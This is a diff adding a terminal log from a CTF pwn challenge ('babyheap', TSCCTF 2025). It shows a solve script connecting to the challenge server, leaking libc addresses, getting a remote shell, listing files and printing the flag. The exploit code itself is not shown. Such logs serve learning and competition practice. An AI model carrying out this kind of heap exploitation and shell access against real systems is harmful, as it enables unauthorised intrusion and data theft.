@@ -1,0 +1,55 @@
+mito@ubuntu:~/CTF/TSCCTF_2025/Pwn_babyheap/chal/share$ python3 solve.py r
+[+] Opening connection to 172.31.3.2 on port 4241: Done
+libc_leak = 0x7fa12820fbe0
+libc_base = 0x7fa128023000
+[*] '/home/mito/CTF/TSCCTF_2025/Pwn_babyheap/chal/share/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] Switching to interactive mode
+$ id
+uid=1000(babyheap) gid=1000(babyheap) groups=1000(babyheap)
+$ ls -l
+total 64
+lrwxrwxrwx   1 root root    7 Oct 11 02:03 bin -> usr/bin
+drwxr-xr-x   2 root root 4096 Apr 15  2020 boot
+drwxr-xr-x   5 root root  340 Jan 13 13:42 dev
+drwxr-xr-x   1 root root 4096 Jan 13 13:42 etc
+drwxr-xr-x   1 root root 4096 Jan 13 13:39 home
+lrwxrwxrwx   1 root root    7 Oct 11 02:03 lib -> usr/lib
+lrwxrwxrwx   1 root root    9 Oct 11 02:03 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root    9 Oct 11 02:03 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root   10 Oct 11 02:03 libx32 -> usr/libx32
+drwxr-xr-x   2 root root 4096 Oct 11 02:03 media
+drwxr-xr-x   2 root root 4096 Oct 11 02:03 mnt
+drwxr-xr-x   2 root root 4096 Oct 11 02:03 opt
+dr-xr-xr-x 680 root root    0 Jan 13 13:42 proc
+drwx------   2 root root 4096 Oct 11 02:09 root
+drwxr-xr-x   5 root root 4096 Oct 11 02:09 run
+lrwxrwxrwx   1 root root    8 Oct 11 02:03 sbin -> usr/sbin
+drwxr-xr-x   2 root root 4096 Oct 11 02:03 srv
+dr-xr-xr-x  13 root root    0 Jan 13 13:42 sys
+drwxrwxrwt   1 root root 4096 Jan 13 13:39 tmp
+drwxr-xr-x   1 root root 4096 Oct 11 02:03 usr
+drwxr-xr-x   1 root root 4096 Oct 11 02:09 var
+$ cd /home
+$ ls
+babyheap
+$ cd babyheap
+$ ls
+chal
+chal.c
+flag
+libc.so.6
+run.sh
+$ ls -l
+total 2016
+-rwxr-xr-x 1 root root   17544 Jan  5 11:32 chal
+-rw-r--r-- 1 root root    1525 Jan  5 11:32 chal.c
+-rw-r--r-- 1 root root      36 Jan  5 11:32 flag
+-rwxr-xr-x 1 root root 2029592 Jan  5 11:32 libc.so.6
+-rwxr-xr-x 1 root root      59 Jan  5 11:34 run.sh
+$ cat flag
+TSC{c0ngrats_0verf10w_1sez_1snt_1t}
